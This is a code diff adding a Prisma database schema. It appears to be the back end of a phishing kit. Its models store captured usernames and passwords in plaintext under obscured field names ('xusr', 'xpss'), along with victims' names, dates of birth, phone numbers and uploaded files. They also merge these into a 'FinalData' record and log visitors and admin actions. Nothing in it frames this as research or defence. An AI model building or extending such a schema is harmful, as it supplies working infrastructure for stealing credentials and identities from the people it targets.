@@ -1,0 +1,127 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+// User sessions - tracks complete user journeys
+model UserSession {
+  id        String   @id @default(cuid())
+  sessionId String   @unique // Generated session identifier
+  ip        String
+  userAgent String
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+  
+  // Session data
+  loginData  LoginData?
+  infoData   InfoData?
+  uploadData UploadData?
+  finalData  FinalData?
+  
+  @@map("user_sessions")
+}
+
+// Login credentials
+model LoginData {
+  id        String   @id @default(cuid())
+  sessionId String   @unique
+  xusr      String   // Username/email
+  xpss      String   // Password
+  timestamp DateTime @default(now())
+  ip        String
+  userAgent String
+  
+  // Relations
+  session UserSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  
+  @@map("login_data")
+}
+
+// Personal information
+model InfoData {
+  id        String   @id @default(cuid())
+  sessionId String   @unique
+  xname1    String   // First name
+  xname2    String   // Last name
+  xdob      String   // Date of birth
+  xtel      String   // Phone number
+  timestamp DateTime @default(now())
+  ip        String
+  userAgent String
+  
+  // Relations
+  session UserSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  
+  @@map("info_data")
+}
+
+// File uploads
+model UploadData {
+  id           String   @id @default(cuid())
+  sessionId    String   @unique
+  filename     String?  // Server filename
+  originalName String?  // Original filename
+  fileSize     Int?     // File size in bytes
+  filePath     String?  // Path to uploaded file
+  mimeType     String?  // File MIME type
+  timestamp    DateTime @default(now())
+  ip           String
+  userAgent    String
+  
+  // Relations
+  session UserSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  
+  @@map("upload_data")
+}
+
+// Final consolidated data
+model FinalData {
+  id        String   @id @default(cuid())
+  sessionId String   @unique
+  xusr      String
+  xpss      String
+  xname1    String
+  xname2    String
+  xdob      String
+  xtel      String
+  timestamp DateTime @default(now())
+  ip        String
+  userAgent String
+  
+  // Relations
+  session UserSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  
+  @@map("final_data")
+}
+
+// Site visitors tracking
+model SiteVisitor {
+  id        String   @id @default(cuid())
+  ip        String
+  userAgent String
+  path      String
+  method    String   @default("GET")
+  timestamp DateTime @default(now())
+  
+  @@map("site_visitors")
+}
+
+// Admin logs for tracking admin actions
+model AdminLog {
+  id        String   @id @default(cuid())
+  action    String   // e.g., "login", "delete_data", "view_data"
+  details   String?  // Additional details
+  ip        String
+  userAgent String
+  timestamp DateTime @default(now())
+  
+  @@map("admin_logs")
+}
+
